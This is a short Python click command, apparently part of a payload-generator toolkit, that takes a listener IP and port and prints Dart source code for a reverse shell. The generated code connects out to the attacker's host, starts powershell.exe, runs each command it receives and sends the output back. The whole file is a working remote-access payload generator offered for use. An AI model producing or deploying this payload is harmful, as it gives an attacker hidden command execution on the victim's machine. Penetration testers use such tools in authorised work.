import click
from colorama import Fore

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Print source only (no label).")
def command(listener_ip, listener_port, raw):
    """Return Dart reverse shell source code"""
    src = f"""import 'dart:io';
import 'dart:convert';

main() {{
  Socket.connect("{listener_ip}", {listener_port}).then((socket) {{
    socket.listen((data) {{
      Process.start('powershell.exe', []).then((Process process) {{
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) {{ socket.write(output); }});
      }});
    }},
    onDone: () {{
      socket.destroy();
    }});
  }});
}}"""
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Dart reverse shell:\n{Fore.WHITE}{src}")
    else:
        click.secho(src, nl=False)
